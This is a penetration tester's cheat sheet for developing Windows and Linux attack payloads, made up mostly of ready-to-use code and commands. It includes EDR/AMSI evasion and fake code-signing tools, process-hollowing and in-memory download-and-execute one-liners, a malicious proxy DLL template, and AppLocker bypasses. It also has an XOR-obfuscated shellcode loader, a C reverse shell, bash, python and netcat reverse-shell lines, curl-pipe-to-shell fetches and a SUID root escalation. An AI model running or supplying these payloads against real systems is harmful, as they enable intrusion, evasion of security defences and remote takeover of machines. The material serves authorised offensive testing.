# __Windows & Linux client payload development__
>Author: Pieter Miske
---
### __Windows payload development:__ 
#### _Payload creation using ScareCrow:_
ScareCrow is a payload creation framework for side loading \(not injecting\) into a legitimate Windows process. It leverages EDR flushing, AMSI/ETW bypassing, fake signing, and more\. 
- 1\. Generate a \.bin shellcode payload in your C2 framework \(e\.g\. Cobalt Strike, PoshC2\)
- 2\. Create obfuscated payload and compile it into a binary \(\.exe\) with fake code signing and all the good bypass stuff:
	- Compile payload (best is to specify a non-microsoft domain if a Microsoft AV/EDR product is running on the target system) \([ScareCrow](https://github.com/optiv/ScareCrow)\): `./ScareCrow -I /<path to shellcode.bin> -domain <www.microsoft.com | www.cisco.com>`
	- Compile payload with bitsadmin remote download one\-liner \(ScareCrow\): `./ScareCrow -I /<path to shellcode.bin> -domain www.microsoft.com -delivery bits -url <URL to download payload from>`

#### _C# process injection payload:_
Process injection is a method of executing arbitrary code in the address space of a separate live process\. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges\. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process\.
>For OPSEC reasons it is recommended to leverage process hollowing injection with process spoofing over other process injection techniques. 
- Payload that performs process hollowing injection with parent spoofing (allows for remote fatching and execution in memory) \([ParentHollowInjection](https://github.com/pietermiske/StagelessHollow)\): `[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("https://<URL>/ParentHollowInjection.exe")); [ParentHollowInjection.Program]::Main(@())`
- Payload that performs basic process hollowing injection \([HollowInjection](https://github.com/pietermiske/StagelessHollow)\): `C:\Windows\Temp\HollowInjection.exe (/program:C:\<path to program.exe>)`

#### _Proxy DLL development for DLL side-loading:_
DLL side-loading (aka DLL hijacking) is an attack in which legitimate software is tricked in loading a malicious DLL instead of the original/missing DLL by abusing the search order. Combine this with the use of a proxy DLL and the execution of the targeted software isn't disrupted in the process. 
>This technique can be used as a payload in a phishing attack or to obtain persistent access. 
- 1\. Identify software that is vulnerable to DLL side-loading (e.g. [Proxmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) can be used for this). For example, the following software is vulnerable:
	- OneDriveStandaloneUpdater.exe (suitable for phishing payload): cryptsp.dll (exec payload + app) \& cryptbase.dll (exec payload)
	- OneDrive.exe (suitable for phishing payload): cscapi.dll (exec payload + app) \& cryptbase.dll (exec payload)
	- Teams.exe (version 1.4.00.11161) (suitable for persistence access): ups10.dll (exec payload + app) \& cryptsp.dll (exec payload + app) \& cryptbase.dll (exec payload)
- 2\. Get a list of all the DLL exports from the original DLL (that is called but not found):
 	- Retrieve the export directives from the original DLL, auto add them to a C template and make a reverence to a shellcode file \([SharpDllProxy](https://github.com/Flangvik/SharpDllProxy)\): `.\SharpDllProxy.exe --dll .\<original>.dll --payload .\<shellcode.bin file>`
	- Create a dump file (.def) with all the DLL exports (this will not fully proxy the targeted app but also not crash it with the benifit that no GUI is loaded) (this option may not always work for every dll): `/usr/bin/gendef <original.dll (e.g. cryptbase.dll)>`
	- Get list of export directives that are ported to C (all function names and ordinals):
		- 1\. In [DLL Export Viewer](http://www.nirsoft.net/utils/dll_export_viewer.html), browse to the original dll
		- 2\. Dump all exports to a htlm file: 'View' > `HTLM Report - All Functions'
		- 3\. Use the Python DLL [htlm parser](https://itm4n.github.io/dll-proxying/) to get a list of all the export directives that can be used in the below C template. 
- 3\. If not already, create/modify a malicious DLL tamplate (basic example tamplate below) (if you have a list of export directives paste them in the tamplate):
    ```C
    #include <processthreadsapi.h>
    #include <memoryapi.h>
    
    //#pragma comment(linker,"/export:CheckSignatureInFile=cryptsp_orig.CheckSignatureInFile,@1")
    
    void DoSomething()
    {
    	STARTUPINFO si;
    	PROCESS_INFORMATION pi;
    
    	char runSomething[] = "calc.exe";
    
    	ZeroMemory(&si, sizeof(si));
    	si.cb = sizeof(si);
    	ZeroMemory(&pi, sizeof(pi));
    
    	CreateProcess(NULL, runSomething, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    }
    
    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fwdReason, LPVOID lpReserved)
    {
    	switch(fwdReason)
    	{
    		case DLL_PROCESS_ATTACH:
    			DoSomething();
    			break;
    		case DLL_THREAD_ATTACH:
    			break;
    		case DLL_THREAD_DETACH:
    			break;
    		case DLL_PROCESS_DETACH:
    			break;
    	}
    	return TRUE;
    }
    ```
- 4\. Compile the proxy DLL:
    - If using Visual Studio, start a new Dynamic-Link Library C/C++ project, add the code and compile.
	- If using the '.def' file:  `x86_64-w64-mingw32-gcc -shared -o cryptbase.dll dlltemplate.c cryptbase.def -s`
	- If export directives in C are pasted in the template: `x86_64-w64-mingw32-gcc -shared -o cryptsp.dll dlltemplate.c -s`

#### _C# payload leveraging InstallUtil & PowerShell Automation – bypass AppLocker/CLM:_
This payload can give you code execution in a by Applocker/CLM restricted environment by leveraging the native Windows Installutil program and the PowerShell Automation DLL\. 
>The payload must be downloaded to disk\. 
- 1\. Copy the following code to Visual Studio:
    ```Csharp
    using System;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;
    using System.Configuration.Install;
    
    namespace Bypass
    {
        class Program
        {
            static void Main(string[] args)
            {
            //main method is not required but can be used to bypass AV
            }   
        }
        [System.ComponentModel.RunInstaller(true)]
        public class Sample : System.Configuration.Install.Installer
        {
            public override void Uninstall(System.Collections.IDictionary savedState)
            {
                String cmd = "<PS COMMAND TO EXECUTE>";
                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;
                ps.AddScript(cmd);
                ps.Invoke();
                rs.Close();
            }
        }
    }
    ```
- 2\. Add the following 2 assembly references: 
	- References > Add Reference > Browse > "C:\\Windows\\assembly\\GAC\_MSIL\\System\.Management\.Automation\\1\.0\.0\.0\_\_31bf3856ad364e35\\System\.Management\.Automation\.dll\."\)
	- References > Add Reference > Assemblies > "System\.Configuration\.Install"
- 3\. The payload can be executed as follows to bypass AppLocker/CLM: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile=/LogToConsole=false /U C:\Users\Public\Documents\Bypass.exe`

#### _XSL payload & WMIC exec method \- bypass application whitelisting:_
This payload can be used as an application whitelisting bypass method in a full AppLocker \(5/5\) enabled environment\. This payload is suitable as a first dropper payload to download and run the actual applocker bypass payload\. So this will not bypass AppLocker/CLM by itself and therefore you need to use additional bypass techniques like 'InstallUtil' or white\-listed directories to actually run a beacon payload\.
- 1\. Modify the following code and save it as dropper\.xsl:
    ```XML
    <?xml version='1.0'?>
    <stylesheet version="1.0"
    xmlns="http://www.w3.org/1999/XSL/Transform"
    xmlns:ms="urn:schemas-microsoft-com:xslt"
    xmlns:user="http://mycompany.com/mynamespace">
    
    <output method="text"/>
        <ms:script implements-prefix="user" language="JScript">
            <![CDATA[
            runC = "cmd.exe /c <command 1> && timeout 4 && <command 2>";
            new ActiveXObject("WScript.Shell").Run(runC,0,true);
            ]]>
        </ms:script>
    </stylesheet>
    ```
- 2\. Run the dropper\.xsl file from a remote location: `C:\Windows\System32\wbem\WMIC.exe process get brief /format:"http://<own ip>/dropper.xsl"`

#### _XML payload leveraging Microsoft\.Workflow\.Compiler\.exe – bypass AppLocker/CLM:_
- 1\. On own system create test\.txt that contains the following C\# code: 
    ```Csharp
    using System;
    using System.Workflow.ComponentModel;
    
    public class Run : Activity {
    	public Run() {
    	    <C# CODE TO EXECUTE>;
    	}
    }
    ```
- 2\. On own system create run\.xml file that contains serialized XML code using the following PowerShell code: 
    ```Powershell
    $workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
    $workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
    $SerializeuInputToWrapper =
    [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper',
    [Reflection.BindingFlags] 'NonPublic, static')
    Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
    $compilerparam = New-Object -Typename Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
    $pathvar = "test.txt"
    $compilerparam.GenerateInMemory = $True
    $output = "C:\users\public\documents\run.xml"
    $tmp = $SerializeuInputToWrapper.Invoke($null,
    @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerpararm, [string[]] @(,$pathvar)))
    Move-Item $tmp $output
    ```
- 3\. Upload both the run\.xml and test\.txt files to the target system and place them in the same folder
- 4\. Bypass applocker and execute the C\# code in the test\.txt file \(the results\.xml argument is just a mandatory parameter to make it work\): `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml
results.xml`

#### _Basic Windows Service EXE payload:_
Quick and easy payload that can start multiple independent processes that are suitable for attacks like 'unquoted service path' and 'modifiable service binary' exploitation\)\.  
- 1\. Modify the C# template so it runs a command:
    ```Csharp
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Linq;
    using System.Text;
    using System.Threading.Tasks;
    
    namespace WindowsService
    {
        class Program
        {
            static void Main(string[] args)
            {
            // start connection
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/C <COMMAND PLACE HOLDER>";
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            var proc = new Process();
            proc.StartInfo = psi;
            proc.Start();
            proc.WaitForExit();
            
            // optional to add second command or run original binary
            psi.FileName = "cmd.exe";
            psi.Arguments = "/C C:\\<PATH TO VULN SERVICE>";
            proc.StartInfo = psi;
            proc.Start();
            proc.WaitForExit();
            }
        }
    }
    ```
- 2\. Compile the template: `csc.exe script.cs`

#### _Payload download/execute one\-liners to include in droppers or to use in RCE situations:_
- Load C# payload (.EXE or .DLL) over http and execute in memory \(make sure the classes/methods are public\): `[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("http://<URL>/payload.exe")); [HInjector.Program]::Main(@(<"1 argument if required>", <"2 argument">))`
- Download file over http and save on disk \(use Apache or simular for hosting): `bitsadmin /Transfer myJob http://<own ip>/file.txt C:\users\public\documents\file.txt`
- Download file over http and save on disk: `iwr http://<own ip>/file.txt -usebasicparsing -outfile C:\users\public\documents\file.txt`
- Download file over SMB and save on disk (internal): `net use Z: \\<IP host running the share>\share (/u:<username> <password>) && copy Z:\<file> C:\users\public\documents\<file>`
- Decode base64 encoded payload back to original binary: `certutil -decode C:\users\public\documents\file.txt C:\users\public\documents\file.exe`
- Import and execute PowerShell script in memory: `IEX(iwr -UseBasicParsing http://<own ip>:<port>/file.ps1)`


---
### __Windows payload obfuscation:__
#### _Payload obfuscation using BokuLoader:_
[BokuLoader](https://github.com/xforcered/BokuLoader) is a Cobalt Strike User-Defined Reflective Loader written in Assembly & C for advanced evasion capabilities.
- 1\. For generating a .EXE beacon, go to the 'arsenal-kit/kits/artifact' file and change the 'STAGE_SIZE=271360' to 'STAGE_SIZE=412256' (this is not required if generating RAW shellcode beacons)
- 2\. Load both the 'artifact.cna' and 'BokuLoader.cna' aggressor scripts
- 3\. It is now possible to build any x64 bit 'Windows Executable (S)' using BokuLoader. 

#### _Payload obfuscation using Mangle:_
Mangle can remove known Indicators of Compromise (IoC) from compiled executables (.EXE or .DLL), change the file by inflating the size to avoid EDRs, and can clone code-signing certs from legitimate files.
- Create obfuscated payload (it is recommended to increase the size by either 95-100 megabytes to avoid EDRs) \([Mangle](https://github.com/optiv/Mangle/releases)\): `./Mangle_1.0_linux_amd64 -I beacon.exe (-C <path to file containing the certificate you want to clone> (-S <100>) -M -O <outfile.exe>`

#### _Payload obfuscation using Donut:_
- 1\. Generate a default \.NET based \.exe beacon/grunt/etc provided by your C2 framework
- 2\. Create obfuscated shellcode \(use \-f 2 to also base64 encode\) \([Donut](https://github.com/TheWover/donut)\): `donut.exe (-f 2) <payload.exe>`

#### _Identify bad code in artifacts and scipts:_
ThreatCheck attempts to find the end of the "bad bytes" and produces a hex dump up from that point\. This can be helpful when trying to identify the specific bad pieces of code in a tool/payload\. 
- Check for bad code \(show as the content closest to the end of the output\): 
	- Artifact \(\.exe | \.dll\) \(real\-time protection can be disabled\) \([ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)\): `ThreatCheck.exe -f <beacon.exe>`
	- Script \(\.ps1\) \(real\-time protection must be enabled\) \(Threatcheck\): `ThreatCheck.exe -f <script.ps1> -e AMSI`

#### _AES shellcode encryption:_
- 1\. Encrypt shellcode for C# dropper \([encrypt](https://github.com/skahwah/encrypt)\): `.\encrypt.exe -l cs -m file -i beacon.bin -e random -o file`
- 2\. Copy and use the 'passwordBytes', 'saltBytes' and 'encryptedShellcode' variables and the 'DecryptShellcode' method in your C# dropper.

#### _Base64 command/binary encoding:_
- PowerShell encoding commands:
	- Windows: `$str = '<command>'; [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))`
	- Linux: `str='<command>' & echo -en $str | iconv -t UTF-16LE | base64 -w 0`
	- CyberChef: use the options 'decode text' \(UTF\-16LE\) \+ 'To Base64'
- Convert \.exe or \.bin to base64 string: `"C:\<path\to>\loader.bin"; [Convert]::ToBase64String([IO.File]::ReadAllBytes($f)) |Out-File enocded.b64`



---
### Linux payload development: 
####  _Payload with obfuscation:_
- 1\. Create encoder:
    ```C
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    unsigned char buf[] = "<SHELLCODE>";
    int main (int argc, char **argv)
    {
        char xor_key = 'J';
        int payload_length = (int) sizeof(buf);
        for (int i=0; i<payload_length; i++)
        {
            printf("\\x%02X",buf[i]^xor_key);
        }
        return 0;
    }
    ```
- 2\. Create shellcode and place it in the placeholder:
	- Run OS command: `msfvenom -p linux/x64/exec CMD="<COMMAND>" \-f c`
	- Reverse shell payload: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<own ip> LPORT=<port> -f c`
- 3\. Compile encoder: `gcc -o encoder.out encoder.c`
- 4\. Run the encoded and copy/paste the string in the script below: `./encoded`
- 5\. Create obfuscated payload:
    ```C
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    // Our obfuscated shellcode
    unsigned char buf[] = "<ENCODED STRING>";
    int main (int argc, char **argv)
    {
        char xor_key = 'J';
        int arraysize = (int) sizeof(buf);
        for (int i=0; i<arraysize-1; i++)
        {
            buf[i] = buf[i]^xor_key;
        }
        int (*ret)() = (int(*)())buf;
        ret();
    }
    ```
- 6\. Compile payload \(the extention of the payload doesn’t matter and can be used to bypass some security restrictions\): `gcc -m64 -fno-stack-protector -z execstack -o payload.out payload.c`

#### _Reverse shell payload:_
- 1\. Create payload\.c:
    ```C
    #include <stdio.h>
    #include <unistd.h>
    #include <netinet/in.h>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <arpa/inet.h>
    
    #define REMOTE_ADDR "10.10.10.10"
    #define REMOTE_PORT 443
    int main(int argc, char *argv[])
    {
        struct sockaddr_in sa;
        int s;
        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
        sa.sin_port = htons(REMOTE_PORT);
        s = socket(AF_INET, SOCK_STREAM, 0);
        connect(s, (struct sockaddr *)&sa, sizeof(sa));
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);
        execve("/bin/bash", 0, 0);
    }
    ```
- 2\. Compile payload: `gcc -m64 -fno-stack-protector -z execstack -o payload.elf payload.c`

#### _Reverse shell one\-liners and scripts:_
- Obfuscated ELF binary that runs as new process: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<own ip> LPORT=443 prependfork=true -f elf -t 300 -e x64/xor_dynamic -o test.elf`
- Resh\.now\.sh script:
	- 1\. Download and create script from resh\.now\.sh: `https://resh.now.sh/<own ip>:<port>`
	- 2\. Use the following line as payload \(URL encode if ran from a webshell\): 
		- If curl is present: `curl http://<own ip>:<port>/shell.sh | sh`
		- If wget is present: `wget http://<own ip>:8080/shell.sh -O resh.sh && chmod +x resh.sh && ./resh.sh`
- Bash: `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
- Python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- Netcat: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`

#### _Bash SUID payload:_
This method can be used to escalate privileges as an alternative for a reverse shell. 
- 1\. Use the following command to create a script which sets the SUID bit for /bin/bash: `echo $'#!/bin/bash\n/bin/chmod u+s /bin/bash' > script.sh`
- 2\. \(optional\) verify if the SUID bit \(\-rw\[s\]r\-xr\-x\) was set successfully: `ls -lah /bin/bash`
- 3\. Escalate current shell to root: `bash -p`

